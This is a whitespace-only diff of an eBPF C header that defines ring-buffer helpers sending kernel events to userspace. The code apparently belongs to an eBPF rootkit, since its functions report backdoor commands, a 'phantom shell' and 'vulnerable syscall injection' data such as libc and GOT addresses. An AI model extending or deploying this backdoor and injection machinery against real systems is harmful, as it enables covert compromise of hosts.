@@ -16,7 +16,7 @@
 
 /**
  * @brief Ring buffer for general communication kernel->userspace
- * 
+ *
  */
 struct ring_buffer {
 __uint(type, BPF_MAP_TYPE_RINGBUF);
@@ -26,7 +26,7 @@ struct ring_buffer rb_comm SEC(".maps");
 
 /**
  * @brief Sends an event into the specified ring kernel buffer
- * 
+ *
  * @return 0 if ok, -1 if error
  */
 static __always_inline int ring_buffer_send(struct ring_buffer *rb, int pid, event_type_t event_type, int code, char* message, __u32 message_len){
@@ -46,7 +46,7 @@ static __always_inline int ring_buffer_send(struct ring_buffer *rb, int pid, eve
 
 /**
  * @brief Sends an event indicating a received command in the backdoor
- * 
+ *
  * @return 0 if ok, -1 if error
  */
 static __always_inline int ring_buffer_send_backdoor_command(struct ring_buffer *rb, int pid, int code, __u32 ip, __u16 port){
@@ -66,7 +66,7 @@ static __always_inline int ring_buffer_send_backdoor_command(struct ring_buffer 
 
 /**
  * @brief Sends an event indicating a received command in the backdoor
- * 
+ *
  * @return 0 if ok, -1 if error
  */
 static __always_inline int ring_buffer_send_request_update_phantom_shell(struct ring_buffer *rb, int pid, int code, struct backdoor_phantom_shell_data data){
@@ -84,8 +84,8 @@ static __always_inline int ring_buffer_send_request_update_phantom_shell(struct 
 }
 
 /**
- * @brief Sends an event indicating a vulnerable syscall injection into the specified ring kernel buffer 
- * 
+ * @brief Sends an event indicating a vulnerable syscall injection into the specified ring kernel buffer
+ *
  * @return 0 if ok, -1 if error
  */
 static __always_inline int ring_buffer_send_vuln_sys(struct ring_buffer *rb, int pid, __u64 syscall_address, __u64 process_stack_return_address, u64 libc_main_address, u64 libc_dlopen_mode_address, __u64 libc_malloc_address, __u64 got_address, __s32 got_offset, int relro_active){
@@ -107,7 +107,7 @@ static __always_inline int ring_buffer_send_vuln_sys(struct ring_buffer *rb, int
 	bpf_ringbuf_submit(event, 0);
     return 0;
 }
-    
+
 
 
 
